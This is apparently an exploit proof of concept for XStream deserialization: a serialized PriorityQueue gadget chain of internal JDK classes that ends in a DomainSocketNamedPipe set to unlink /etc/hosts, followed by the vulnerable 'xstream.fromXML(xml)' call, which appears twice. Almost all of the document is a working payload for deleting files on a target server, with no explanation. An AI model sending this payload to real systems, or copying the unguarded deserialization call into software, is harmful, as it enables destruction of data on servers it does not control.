<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource'>
                <part>
                  <dataHead>
                    <tail/>
                    <head>
                      <data class='com.sun.xml.internal.org.jvnet.mimepull.MemoryData'>
                        <len>3</len>
                        <data>AQID</data>
                      </data>
                    </head>
                  </dataHead>
                  <contentTransferEncoding>base64</contentTransferEncoding>
                  <msg>
                    <it class='java.util.ArrayList$Itr'>
                      <cursor>0</cursor>
                      <lastRet>1</lastRet>
                      <expectedModCount>4</expectedModCount>
                        <outer-class>
                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                        </outer-class>
                    </it>
                    <in class='java.io.FileInputStream'>
                      <fd/>
                      <channel class='sun.nio.ch.FileChannelImpl'>
                        <closeLock/>
                        <open>true</open>
                        <threads>
                          <used>-1</used>
                        </threads>
                        <parent class='sun.plugin2.ipc.unix.DomainSocketNamedPipe'>
                          <sockClient>
                            <fileName>/etc/hosts</fileName>
                            <unlinkFile>true</unlinkFile>
                          </sockClient>
                          <connectionSync/>
                        </parent>
                      </channel>
                      <closeLock/>
                    </in>
                  </msg>
                </part>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
XStream xstream = new XStream(); 
xstream.fromXML(xml);
XStream xstream = new XStream(); 
xstream.fromXML(xml);
